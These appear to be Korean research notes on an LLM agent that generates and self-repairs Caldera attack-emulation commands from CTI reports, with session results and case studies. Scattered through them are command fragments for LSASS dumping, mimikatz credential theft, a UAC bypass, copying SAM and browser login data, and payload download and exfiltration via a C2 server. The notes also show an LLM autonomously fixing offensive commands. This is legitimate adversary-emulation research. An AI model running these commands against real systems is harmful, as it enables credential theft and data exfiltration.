# 연구 노트

> 진행 기록. 실험 결과, 개선점, 한계점 누적.

---

## 연구 주제

**"SVO 의미 제약 기반 공격 명령어 자가 복구 시 생성 명령어 특성 분석"**

- 자연어 CTI 보고서 → MITRE ATT&CK 기법 추출 → SVO 트리플릿 → Caldera Ability 생성 → ReAct 자율 수정
- 핵심 질문: SVO 의미 제약을 유지하면서 자가복구할 때, 어떤 컴포넌트(S/V/O)가 수정되고, 그 수정이 성공/실패에 어떤 영향을 주는가?

---

## 세션별 실험 결과

> 유효 세션 기준: LLM 자기분류(FailureType + SVOFocus) 도입 이후 (162157~)

### Thief 시나리오 (APT29-style 데이터 수집/유출)

기법: T1074.001, T1005, T1560.001, T1041 (5 links)

| 세션 | 초기 성공 | 최종 성공 | 라운드 | 주요 이슈 |
|------|---------|---------|------|----------|
| 162157 | 4/5 | **5/5** | 2 | LLM FailureType+SVOFocus 도입 첫 세션. T1041 **O 생성 전략** 관찰 |
| 195304 | 3/5 | **5/5** | 3 | T1074.001 중복×2 모두 실패. **icacls→attrib 도구 전환**, **S문제→O교체** 패턴 관찰 |

### APT3 시나리오 (Gothic Panda, 12 기법)

기법: T1588.003, T1195, T1053.005, T1543.003, T1068, T1027.013, T1556.002, T1057, T1021.001, T1119, T1573.002, T1048.003

| 세션 | 초기 성공 | 최종 성공 | 라운드 | 비고 |
|------|---------|---------|------|------|
| 163540 | 9/12 (75%) | 9/12 (75%) | 3 | LLM FT+SVOFocus 도입. T1543.003 UAC 수동개입 포함. false positive 의심 |

### FIN7 시나리오 (Carbanak, 10 기법)

기법: T1204.002, T1053.005, T1547.001, T1555.003, T1003.001, T1057, T1518.001, T1119, T1041, T1070.004
※ T1547.001은 매 세션 false positive. T1119는 구 VM에서 false positive였으나 신규 VM에서 실제 실패/성공.

| 세션 | 초기(실제) | 최종(실제) | 라운드 | 비고 |
|------|---------|---------|------|------|
| 202040 | 4/10 (40%) | 5/10 (50%) | 3 | fork/exec 환경 제약 최초 확인 (구 VM) |
| 141800 | 4/10 (40%) | **6/10 (60%)** | 3 | T1204.002 R3 성공 (기존 파일 활용), T1070.004 R3 성공 (구 VM) |
| 141853 | 4/10 (40%) | **5/10 (50%)** | 3 | T1204.002 환각 파일명으로 3라운드 실패 (구 VM) |
| 161523 (SVO) | 5/10 (50%) | **8/10 (80%)** | 3 | 신규 VM. T1003.001 R2 성공(RunAs+UAC), T1555.003·T1119 성공. T1204.002·T1053.005 실패 |
| 162315 (noSVO) | 5/10 (50%) | **8/10 (80%)** | 3 | 신규 VM, ablation. T1053.005 R3 성공(quoting), T1555.003·T1119 성공. T1204.002·T1003.001 실패 |
| 193441 (SVO) | 7/10 (70%) | **10/10 (100%)** | 2 | **URL path 수정 후**. T1204.002·T1053.005 초기 성공. T1003.001 R2·T1119 R1·T1555.003 R2 성공 |
| 193505 (noSVO) | 8/10 (80%) | **10/10 (100%)** | 2 | **URL path 수정 후, ablation**. T1003.001 R2·T1555.003 R1 성공. T1053.005 R2 상태 충돌 후 재성공 |

### APT29 시나리오 (30 기법, T1529 제외)

기법: T1036.002, T1059.001, T1547.009, T1037.005, T1548.002, T1134.001, T1036.005, T1055, T1070.004, T1112, T1134, T1016, T1082, T1033, T1057, T1007, T1069, T1087, T1012, T1018, T1049, T1083, T1003, T1552.004, T1119, T1113, T1115, T1056.001, T1105, T1041

| 세션 | 초기 성공 | 최종 성공 | 라운드 | 비고 |
|------|---------|---------|------|------|
| 143322 | 26/30 (87%) | **29/30 (97%)** | 3 | T1003(mimikatz→cmdkey V 드리프트 후 실패). T1007·T1134·T1036.005·T1105 성공 |
| 171757 | 19/30 (63%) | **26/30 (87%)** | 3 | T1055·T1134.001·T1036.002·T1056.001 지속 실패. T1003 R2 cmdkey V드리프트 **성공** (143322과 동일 전략, 다른 결과) |

---

## 한계점

### 구조적 한계 (코드/설계)

1. **false positive 잔존**: `ForEach-Object` 빈 루프 = exit 0. 명령어 논리적 성공 여부를 exit code만으로 판단 불가. `nltest /dclist:<domain>`, `Test-Path` 조건문, `Start-Process`(비동기) 등 "실패해도 exit 0"인 도구/패턴이 동일하게 false positive 유발. stderr에 에러가 찍혀도 Caldera는 exit code만 보기 때문에 success 처리됨 — **T1018 Remote System Discovery**에서 DC 미발견(`I_NetGetDCList failed: ERROR_NETWORK_UNREACHABLE`) 상태임에도 success로 기록된 사례 확인
2. **멀티라인 명령어 불가**: Caldera 플랫폼 제약. 긴 스크립트 표현이 어려움

### 환경적 한계

1. **권한 제약**: User 권한으로 서비스 생성(T1543.003), Password Filter DLL 등록(T1556.002) 불가. ReAct로 우회 불가능한 구조적 한계
2. **Caldera payload 의존**: `'File key was not provided'` — 없는 파일 참조 시 실패. 실제 공격과 달리 Caldera payload 목록에 의존
3. **C2 업로드 구조**: `/file/upload`는 agent-authenticated 엔드포인트. 일반 HTTP 클라이언트로 접근 시 X-Request-Id 헤더 필요
4. **GUI 프로세스 Timeout**: mstsc, msconfig 등 GUI 앱은 60초 내 종료 안 됨 → 강제 종료
5. **fork/exec 환경 제약**: Caldera Go 에이전트가 자식 프로세스 spawn을 거부. PowerShell 명령 수정으로 해결 불가 (T1003.001 등)

### 연구 관점 한계

1. **성공의 의미**: 많은 경우 "성공"이 실제 공격 행위 수행 vs 에러 없이 종료(false positive)를 구분하기 어려움
2. **단계 간 정보 흐름 불가 (Facts 미활용)**: 현재 파이프라인은 각 ability가 SVO 기반으로 사전 정적 생성되어 독립 실행됨.
   Caldera의 Facts/Relationships 시스템(이전 링크 출력 → 변수 추출 → 다음 링크 주입)을 활용하지 않아 전술 간 체인이 불가능.
   - **예시**: T1057(Process Discovery)로 수집한 PID/프로세스명을 T1543.003(Service)에 활용 불가
   - **예시**: T1021.001(RDP)에서 접속할 IP를 Discovery 단계에서 동적으로 얻어 주입 불가 — 명령어에 IP가 하드코딩됨
   - **결과**: Lateral Movement, Credential Access 등 이전 단계 결과에 의존하는 전술은 정적 더미값으로 실행되거나 실패
   - **연구 범위**: 본 연구는 "단일 ability 내 SVO 기반 자가복구"에 집중. 다단계 Facts 체인은 향후 과제.

---

## 주요 관찰 사례 (논문용)

### T1074.001 (Ability1) — 반복 실패 도구 포기 → 단순 도구 전환 (195304)

- SVO: agent **create** hidden staging directory + file
- R1: `icacls /grant "$env:USERNAME":(OI)(CI)F` 추가 → quoting 오류 (FT=object_failure)
- R2: 따옴표 위치 수정 `"$env:USERNAME:(OI)(CI)F"` → `(OI)(CI)F` 파라미터 자체 에러 (FT=syntax_failure)
- R3: **icacls 완전 포기** → `attrib +h` + `Set-Content` → 성공 (FT=object_failure)
- **의의**: 3라운드에서 반복 실패 도구를 버리고 더 단순한 V로 전환. icacls quoting이 해결 불가 수준이 되자 attrib으로 교체.

### T1074.001 (Ability2) — S문제를 O 교체로 우회 (195304)

- SVO: agent **copy** SAM file → staging
- 원본: `Copy-Item "C:\Windows\System32\config\SAM"` → Access denied
- R1: SAM 포기 → `C:\temp\.stage` + `attrib +h` + 더미 파일 생성 → 성공 (FT=subject_failure, SVOFocus=O)
- **의의**: 권한 문제(S)인데 LLM은 O(SAM)를 User 접근 가능한 더미로 교체해서 해결. V(copy→staging)는 유지. "S 문제를 O 교체로 우회"하는 전략 — subject_failure임에도 SVOFocus=O.

### T1543.003 — 다층 실패 레이어 순차 노출 (163540)

- SVO: agent **install** Windows service
- 원본: `sc.exe create` → Access is denied (권한 문제)
- R1: 파일 다운로드 추가 후 sc.exe → 다운로드 실패로 전환 (FT=subject_failure→S 수정)
- R2: Start-Process sc.exe ArgumentList → quoting 구문 에러 (FT=syntax_failure→V 수정)
- R3: bitsadmin 다운로드 도구 교체 → Timeout (UAC 팝업, 수동 개입 시 성공)
- **LLM 분류 변화**: subject_failure → syntax_failure → object_failure (라운드마다 다른 에러 → 다른 분류)
- **의의**: 한 레이어를 고치면 그 아래 레이어가 드러나는 "양파 구조". 동일 기법인데 FT와 SVOFocus가 매 라운드 달라짐.

### T1003.001 — fork/exec 환경 제약 + no_fix 적절 판단 (202040)

- SVO: agent **dump** LSASS memory
- 에러: `fork/exec C:\Windows\...\powershell.exe: Access is denied. exit_code: -1`
  - PowerShell 명령 에러가 아닌 **Caldera Go 에이전트의 자식 프로세스 spawn 자체가 거부**
- R1: `Start-Process rundll32.exe` 시도 → 동일 에러 (FT=subject_failure)
- R2~R3: `no_fix` (FT=unknown) — LLM이 해결 불가 판단
- **의의**: 에이전트 프로세스 권한 레벨의 환경 제약. PowerShell 명령 수정으로 해결 불가. LLM의 `no_fix`는 적절한 판단.

### T1204.002 — URL path 형식 발견 (202040)

- SVO: agent **download** malicious file
- 원본: `WebClient.DownloadFile(?file=a6956d_...)` → 404
- R1: `?filename=` 파라미터명 변경 → 404 (FT=object_failure)
- R2: `/file/download/a6956d_CreateProcessWithPipe.exe` (path 방식) → **성공** (FT=object_failure)
- **의의**: Caldera 파일 다운로드에서 query param(`?file=`) 실패 시 URL path(`/file/download/파일명`) 방식이 동작함을 LLM이 발견. O 방향 반복 수정 중 유효한 API 형식을 탐색해 성공.

### T1053.005 — /TR 중첩 quoting 3라운드 실패 (202040)

- SVO: agent **create** scheduled task
- 에러: `schtasks ... "powershell ... \"Start-Process notepad\"" /SC ONLOGON` → `Invalid syntax. Mandatory option 'sc' is missing`
- R1~R3: New-ScheduledTaskAction, Register-ScheduledTask, schtasks 단순화 모두 실패 (FT=syntax_failure 일관)
- **의의**: Caldera 에이전트가 명령 실행 시 중첩 따옴표를 파싱하면서 `/SC` 옵션이 잘려나가는 구조적 문제. LLM이 syntax_failure로 일관 분류하고 매 라운드 V 방향으로 도구를 교체하지만 근본 원인(Caldera quoting) 미해결.

### T1195/T1556.002 — O 반복 수정 + 해결 불가 패턴 (163540)

- SVO: T1195=replace supply chain binary / T1556.002=drop password filter DLL
- 3라운드 모두 object_failure. 파라미터명(`file`→`key`), URL 구조(`?key`→`/path`), 헤더 추가 등 O 방향 수정 반복
- T1556.002 R2: `env_failure` 오분류 → X-Request-Id 헤더(업로드용)를 다운로드에 적용하는 오류 → R3에서 object_failure로 재분류 후 O 수정으로 복귀
- **근본 원인**: 파일이 Caldera payload 라이브러리에 없음 → ReAct로 해결 불가

### T1041 — O 생성 전략 (162157 Round 2)

- SVO: agent **exfiltrate** archive.zip → C2
- 원본: `$filePath = "archive.zip"` — 파일 존재하지 않아 OpenRead 실패
- Round 1: 절대경로 → 상대경로(`".\archive.zip"`) 변경 → 동일 에러 (경로 문제 아님)
- Round 2: `New-Item -Path "$env:TEMP\archive.zip" -ItemType File -Force` 먼저 실행 → 업로드 성공
- SVO 분석: V(exfiltrate/upload)는 유지, **O를 직접 생성해서 확보** 후 V 실행
- **의의**: object_failure지만 V를 바꾸지 않고 O를 먼저 생성하는 전략 선택.

### SVO 실패 초점의 라운드 간 이동 (다중 세션 반복 관찰)

- **현상**: 동일 기법을 여러 라운드 시도할 때 failure_type과 SVOFocus가 매 라운드 달라짐
- **사례**:

  | 기법 | R1 | R2 | R3 |
  |------|----|----|-----|
  | T1543.003 (163540) | subject_failure / S | syntax_failure / V | object_failure / O |
  | T1074.001 (195304) | object_failure / O | syntax_failure / O | object_failure / O |
  | T1053.005 (141800) | object_failure / O (download 혼동) | env_failure / O | subject_failure / V |

- **해석**: 명령어가 복합 구조(다운로드+실행+등록 등)일 때, 한 레이어를 수정하면 그 아래 레이어가 다음 에러로 드러남. LLM은 드러난 에러를 기반으로 매 라운드 다시 분류하고 다른 SVO 요소를 수정함.
- **연구적 의의**: failure_type과 SVOFocus는 기법 단위가 아닌 **라운드 단위**로 분석해야 함.

### T1003.001 — S 수정으로 권한 상승 성공 (161523 SVO, R2)

- SVO: agent **dump** LSASS memory
- 원본: `$pid=(Get-Process -Name lsass).Id;...rundll32.exe comsvcs.dll,MiniDump $pid $out` → `$pid`가 PowerShell 예약 변수($PID=현재 프로세스 ID), read-only 에러
- R1: `$pid` → `$lsassPid` 변수명 교체 (FT=syntax_failure, SVOFocus=V) → dump 미생성, "Could not find lsass.dmp" (권한 부족)
- R2: `Start-Process -FilePath rundll32.exe -ArgumentList @('comsvcs.dll,MiniDump',...) -Verb RunAs -Wait` (FT=subject_failure, SVOFocus=S) → **성공**
- **성공 조건**: 신규 VM에서 UAC 자동 승인(또는 비활성화)으로 `-Verb RunAs` 상승 통과. 구 VM에서는 fork/exec 에러로 시도 자체가 불가했던 환경 차이.
- **SVO 기여**: SVOFocus=S로 "실행 주체 권한 상승"이라는 방향을 정확히 프레이밍. verb(dump)·object(LSASS)는 유지하면서 subject만 수정.

### T1003.001 — S 수정 실패: schtasks 래핑 함정 (162315 noSVO, R1~R3)

- 동일 원본, 동일 R1 수정 ($lsassPid 교체) — 이후 경로 분기
- R2: `schtasks /create ... /TR "rundll32.exe comsvcs.dll,MiniDump ..."` 래핑 시도 → "Could not find lsass.dmp" (schtasks는 실행됐으나 dump 미생성)
- R3: schtasks에 `/ST 00:00` 등 추가 → "ERROR: No value specified for /ST option" → 실패
- **실패 원인**: SVO 제약 없이 "권한 상승 수단"을 schtasks로 선택했으나, schtasks는 즉시 실행이 아닌 예약이라 결과 파일이 생성되지 않음. V 접근 방식 선택에서 틀림.
- **SVO vs noSVO 차이**: SVO는 SVOFocus=S로 "주체 권한" 문제에 집중 → RunAs 선택. noSVO는 FT=subject_failure를 인식했으나 schtasks 우회라는 잘못된 V 수단 선택.

### T1053.005 — quoting 탈출 실패: SVO 반복 수렴 (161523 SVO, R1~R3)

- SVO: agent **create** scheduled task (Windows service 등록 포함)
- 원본: `powershell -NoProfile -Command "$url='#{server}/file/download?...'; $out='C:\Windows\Temp\svc.exe'; ... schtasks /create ..."`
- 3중 quoting 구조: **Caldera 템플릿 치환** → **PowerShell -Command 파싱** → **내부 스크립트 실행**
- R1: outer single(`'`) + inner double(`"`) → DownloadFile(,) 인자 빈값 (변수 미확장)
- R2: outer double(`"`) + inner single+escape(`\"`) → URL이 명령어로 해석
- R3: R2와 동일 패턴 → "string missing terminator: \"" ← **R2와 거의 동일 명령어 반복**
- **실패 원인**: SVOFocus=V(3라운드 연속)로 "동사 구현 구문"만 수정. R2→R3에서 실질적 변화 없음 — SVO V 제약이 quoting 방향 전환을 막고 동일 실패 루프에 갇힘.
- **noSVO R3 성공 비교**: noSVO는 outer single + inner double + `C:\Windows\Temp`(절대경로, 환경변수 없음)로 확장 문제 회피. SVO는 `$env:TEMP` 사용으로 단일따옴표 내 확장 실패 반복.

### SVO vs noSVO ablation — 최초 비교 실험 (161523 vs 162315, 신규 VM)

- **조건**: 동일 FIN7 시나리오, 신규 VM(UAC 비활성화 환경), `--force-generate`
- **결과**: 양쪽 모두 **8/10** — 성공률 차이 없음

| 기법 | SVO | noSVO |
|------|-----|-------|
| T1555.003 | R1 성공 | R1 성공 |
| T1119 | R3 성공 | R2 성공 |
| T1003.001 | **R2 성공** (RunAs/S) | R3 실패 (schtasks/V 오판) |
| T1053.005 | R3 실패 (quoting 반복) | **R3 성공** (quoting 방향 전환) |
| T1204.002 | 실패 (파일 없음) | 실패 (파일 없음) |

- **관찰 1**: FailureType 분류 정확도 — SVO 있을 때 T1053.005를 `syntax_failure`(정확), noSVO는 R1에서 `subject_failure`(오분류). 오분류에도 불구하고 noSVO가 결국 성공 → 분류 정확도와 수정 성공 간 직접 상관 불분명.
- **관찰 2**: SVO가 탐색 방향을 고정: T1003.001은 SVOFocus=S로 올바른 방향 → 성공. T1053.005는 SVOFocus=V로 3라운드 고정 → 탈출 실패. **SVO 제약이 유리하게도, 불리하게도 작용함.**
- **관찰 3**: T1204.002는 양쪽 모두 3라운드 실패 — 프롬프트 속 파일 경로 설정 실패로 인한 실패, SVO 유무 무관.

### URL path 수정 효과 (193441 vs 161523)

- `/file/download/<filename>` 경로 수정 후 T1204.002·T1053.005 초기 성공 (ReAct 불필요)
- 초기 성공률: 5/10(50%) → **7~8/10(70~80%)**, 최종: 8/10 → **10/10(100%)**
- 파라미터 형식(`?file=`) 오류는 LLM 프롬프트 문제였고 SVO 수정과 무관한 인프라 이슈

### T1003.001 — 동일 R1 수정, 다른 R2 V 구현 (193441 SVO vs 193505 noSVO)

- 두 세션 모두 R1에서 동일하게 `$pid` → `$lsassPid` 변수명 교체 (예약변수 충돌 해결)
- R2 성공 수단이 다름:
  - SVO: `Start-Process -FilePath rundll32.exe -ArgumentList "comsvcs.dll, MiniDump $lsassPid"` (비동기 래핑)
  - noSVO: `& "$env:SystemRoot\System32\rundll32.exe" comsvcs.dll,MiniDump $pid; Start-Sleep` (`&` call operator + 절대경로)
- **의의**: R1 수정은 수렴(동일), R2 V 구현은 발산(다른 도구). 문제 식별은 동일하지만 해결 수단은 비결정적.

### T1119 — O 교체 패턴 재확인 (193441 SVO R1)

- 원본: `Get-ChildItem Documents -Include *.txt` → 파일 없음 (object_failure)
- R1: `$src = "$env:WINDIR\system.ini"` (항상 존재하는 시스템 파일로 O 교체) → 성공
- verb(collect/copy)·upload 구조 유지. T1074.001 Ability2·T1041과 동일한 O 교체 전략.
- **패턴 일반화**: 대상 파일 부재 시 LLM은 실존이 보장된 시스템 파일(system.ini, dummy 등)로 O를 교체하는 전략을 반복 선택.

### T1555.003 — Test-Path 조건화 (false positive) (193505 noSVO R1)

- 원본: `Copy-Item "Chrome\Login Data"` → Chrome 미설치로 경로 없음
- R1 (noSVO): `if (Test-Path "Chrome\Login Data") { Copy-Item ... }` → **exit 0** (if 블록 미실행)
- **false positive**: Chrome 없으면 조건 미충족 → 파일 복사 실제 미발생 → 하지만 exit 0 반환
- SVO R2도 동일 패턴으로 성공 처리. 성공 판정 기준(exit code)의 한계를 다시 노출.

### T1053.005 noSVO — 라운드 간 상태 충돌 (193505 R2)

- T1053.005 초기 성공(작업 등록) → R2 전체 operation 재실행 → "Cannot create a file when that file already exists" 에러
- R2 수정: 작업명 변경 or `-Force` 추가 → 성공
- **원인**: 전 라운드에서 등록된 Scheduled Task가 시스템에 잔존. 전체 operation 재실행 구조에서 상태가 누적되어 이미 성공한 기법이 재실행 시 충돌.
- **연구적 의의**: ReAct 라운드 재실행이 이전 성공 기법에 side effect를 만드는 구조적 부작용.

### T1003 — mimikatz→cmdkey V 드리프트 후 quoting 함정 (143322, R1~R3 실패)

- SVO: agent **dump** credentials (OS Credential Dumping)
- 원본: `powershell -NoProfile -Command "Start-Process -FilePath 'mimikatz.exe' -ArgumentList 'privilege::debug sekurlsa::logonpasswords' -WindowStyle Hidden"`
  - mimikatz.exe 미존재 → env_failure
- R1 [object_failure / SVOFocus=O]: `cmdkey /list` + 파일 저장 + C2 업로드
  - **V 드리프트**: dump(LSASS) → list(저장 자격증명 열거). 전혀 다른 기법으로 전환.
  - 에러: "The system cannot find the file specified" (Start-Process 잔여 구문 문제)
- R2 [syntax_failure / SVOFocus=V]: `$filePath = $env:TEMP + '\creds.txt'` (문자열 연결로 quoting 수정)
  - 에러: "The string is missing the terminator: \""
- R3 [unknown / SVOFocus=없음]: 빈 명령어 (LLM 포기) → 이전 명령어 재실행 → 동일 에러 → **최종 실패**
- **의의**:
  1. LLM이 실행 불가 도구(mimikatz)를 인식하고 대안(cmdkey)으로 전환 — 합리적 V 드리프트
  2. 하지만 드리프트 후 quoting 함정에 빠져 탈출 실패 — 방향 전환과 구문 수정을 동시에 못함
  3. T1003 V 드리프트: "dump LSASS" → "list stored credentials" — 동일 ATT&CK ID지만 실제 수행 동작이 다름. **의미 이탈형 false positive의 반대 사례** (이탈하려 했으나 실패).

### T1105 — V 수단 3회 전환으로 원격 전송 성공 (143322, R3)

- SVO: agent **copy** file → remote host (Ingress Tool Transfer)
- R1 [object_failure / SVOFocus=O]: PSSession + Copy-Item → "network name cannot be found" (호스트 접근 불가)
- R2 [env_failure / SVOFocus=V]: TrustedHosts 설정 + New-PSSession → "cannot connect to 192.168.50.234"
- R3 [env_failure / SVOFocus=V]: psexec.exe 다운로드 + `Copy-Item -Path $src -Destination '\\192.168.50.234\...'` → **성공**
- **의의**: 원격 전송 수단을 매 라운드 교체 (PSSession → WinRM 설정 → psexec+UNC). R2는 환경 준비(TrustedHosts)를 먼저 시도했으나 WinRM 자체가 막혀있어 R3에서 psexec 방식으로 우회. **V 탐색 전략이 성공한 사례**.

### T1007 — sc.exe 단순 V 전환 (143322, R1)

- 원본: PowerShell Set-Content → "positional parameter cannot be found"
- R1: `sc.exe query type= service state= all` → 성공
- 가장 단순한 V 전환 패턴: PowerShell 구문 오류 → native CLI 도구로 교체.

---

## Session 171757 — APT29 추가 실험 (30 기법)

> 143322과 동일 시나리오 재실행. 초기 성공률이 낮아 더 많은 ReAct 수정 사례 관찰.

### 성과 요약

| 단계 | 성공 | 실패 | 성공률 |
|------|------|------|--------|
| 초기 실행 | 19/30 | 11 | 63.3% |
| R1 후 | 23/30 | 7 | 76.7% |
| R2 후 | 26/30 | 4 | 86.7% |
| R3 후 (수렴) | 26/30 | 4 | **86.7%** |

**R1 수정 성공 (4개)**: T1007(sc→sc.exe), T1112(O 생성), T1070.004(graceful degradation), T1036.005(O 교체 System32→APPDATA)
**R2 수정 성공 (3개)**: T1548.002(nested quoting 2라운드), T1003(cmdkey V 드리프트), T1041(O 생성 2라운드)
**R3 수렴 실패 (4개)**: T1036.002, T1134.001, T1055, T1056.001

### T1041 — O 생성 전략 지연 (171757, R2)

- O="draft.zip" (구체적 파일명) → LLM이 파일이 존재한다고 가정하고 `$filePath="draft.zip"` 직접 사용
- R0: `OpenRead("draft.zip")` → 파일 없음 실패
- R1: `Resolve-Path .\draft.zip` 시도 → 여전히 없음 (잘못된 O-search 진단)
- R2: `if(!(Test-Path $filePath)){New-Item -Force}` → **O 생성** 적용 → 성공
- **vs 143322**: O="compressed archive"(추상) → LLM이 처음부터 `Compress-Archive`로 파일을 직접 생성 → 초기 성공
- **의의**: **O의 구체성이 초기 명령어 전략을 결정함.** 구체적 파일명 O → 파일 존재 가정 → 초기 실패. 추상적 O → 자기 완결 명령어 생성 → 초기 성공.

### T1003 — V 드리프트 비결정성: 동일 전략, 다른 결과 (171757 vs 143322)

- 두 세션 모두 동일 SVO(V=dump, O=credentials, S=invoke-mimikatz)
- R0: invoke-mimi.ps1 다운로드 + 실행 → 실패 (두 세션 공통)
- R1: 171757은 IEX 방식으로 전환 실패 / 143322은 cmdkey /list V 드리프트
- R2: **171757이 cmdkey V 드리프트 → 성공** / 143322은 R1에 cmdkey로 드리프트했으나 quoting 함정으로 실패
- 동일 V 드리프트 전략(mimikatz→cmdkey)이 한 세션은 성공, 다른 세션은 실패
- **의의**: LLM 수정 전략의 비결정성. 동일한 "합리적 V 드리프트"도 실행 시점의 구문 선택에 따라 성패가 갈림.

### T1134.001 — 네트워크 의존 기법의 반복 실패 (171757, R0~R3)

- SVO: V=**inject**, O=privileged process → invoke-mimi.ps1 다운로드 + Invoke-Mimikatz 실행
- R0~R3: DownloadFile+`. $script` → DownloadString+IEX → IEX(약어) → 동일 반복
- 근본 원인: invoke-mimi.ps1 서버 응답 실패(HTML 반환). 네트워크 계층 장벽.
- **vs 143322**: V=**steal**, O=access token → `whoami /all > token.txt` + C2 업로드 → 초기 성공
- **SVO V 차이가 명령어 접근법을 완전히 바꿈**: "steal"은 로컬 정보 수집, "inject"는 네트워크 의존 페이로드.

### T1055, T1056.001 — 구조적 실패: 코드 스타일 변형만 반복

- **T1055**: R0-R2에서 C# Add-Type DLL 인젝션 코드 동일(클래스명/메서드 구조 소폭 변형). R3에서 DownloadFile→Invoke-WebRequest 교체. 인젝션 자체는 AV/권한 차단.
- **T1056.001**: R0-R3 전 라운드 동일 nested PowerShell WinForms 키로거. 외부→내부 따옴표 교체만 반복. R3에 C2 업로드 루프 추가. 근본 원인(중첩 PowerShell+Add-Type 실행 차단) 미해결.
- **패턴**: 구조적 실행 차단(AV, 중첩 shell 제약)은 ReAct 명령어 수정으로 해결 불가. 코드 스타일 변형은 에러를 재현할 뿐.

---

## SVO → 초기 명령어 전략 비교 (143322 vs 171757, 동일 시나리오)

> 동일 APT29 시나리오를 두 번 실행했을 때 SVO 추출 결과 차이와 그 명령어 영향 분석.

### SVO 추출 비교

| TID | 143322 SVO (V / O) | 171757 SVO (V / O) | 변화 |
|-----|-------------------|-------------------|------|
| T1548.002 | steal / high-privilege token (memory) | bypass / user account control (service) | V+O 완전 다름 |
| T1134.001 | steal / access token (memory) | inject / privileged process (process) | V+O 완전 다름 |
| T1041 | upload / compressed archive | upload / draft.zip | O 추상→구체 |
| T1007 | list / services | enumerate / services | V 유사 표현 |
| T1036.002 | execute / cod.3aka3.scr payload | execute / cod.3aka3.scr | O 수식어 차이 |
| T1036.005, T1055, T1070.004, T1112, T1003, T1056.001 | 동일 | 동일 | — |

### SVO 차이 → 명령어 전략 차이 → 초기 성공률 차이

**T1548.002**
- 143322(V=steal token): `sdclt.exe /kickoffelevated` — 1줄 직접 실행 → **초기 성공**
- 171757(V=bypass UAC): sdclt registry 등록 + IEX payload + RunAs 체인 → nested quoting 실패 → R2에서야 해결

**T1134.001**
- 143322(V=steal, O=token): `whoami /all > token.txt` + C2 업로드 — 로컬 정보 수집 → **초기 성공**
- 171757(V=inject, O=process): invoke-mimi.ps1 다운로드 + Invoke-Mimikatz — 네트워크 의존 → R3까지 실패

**T1041**
- 143322(O=compressed archive, 추상): `Compress-Archive ... totallylegit.exe` — 파일을 스스로 생성 → **초기 성공**
- 171757(O=draft.zip, 구체): `$filePath="draft.zip"` 존재 가정 — 없으면 실패 → R2에서 O 생성 전략 적용

**T1070.004 / T1112** (SVO 동일, 명령어 상이 — LLM 비결정성)
- 143322: 각각 자기 파일/키를 생성 후 삭제하는 self-contained 구조 → **초기 성공**
- 171757: 특정 경로 파일/키가 존재한다고 가정하는 구조 → 없으면 실패 → R1에서 O 생성 적용

### 핵심 발견: SVO 추상성과 명령어 자기 완결성의 상관관계

| SVO O 유형 | 명령어 전략 | 초기 성공 가능성 |
|------------|------------|----------------|
| **추상적** (compressed archive, staging files) | 자기 완결: 객체를 스스로 생성 후 조작 | 높음 |
| **구체적** (draft.zip, C:\Temp\staging.txt) | 조건 의존: 파일/키 존재 가정 | 낮음 (없으면 실패) |
| **메커니즘** V (steal → whoami) | 단순 로컬 도구 | 높음 |
| **페이로드** V (inject → mimikatz 다운로드) | 네트워크 의존 페이로드 | 낮음 (서버 응답 필요) |

- **추상적 SVO**는 LLM이 자유롭게 self-contained 명령어를 생성 → 초기 성공률 ↑
- **구체적 SVO**(시나리오 기술의 특정 파일명/도구명 반영)는 전제 조건을 만드는 명령어 → 초기 실패, ReAct 필요
- **V의 구현 방향**(steal/enumerate vs inject/dump)이 명령어의 네트워크 의존성 결정 → 네트워크 의존 V는 ReAct로도 해결 불가인 경우 있음
- 143322(초기 26/30) vs 171757(초기 19/30) 차이의 주요 원인: 동일 시나리오에서 SVO 추출의 추상성/구체성 차이
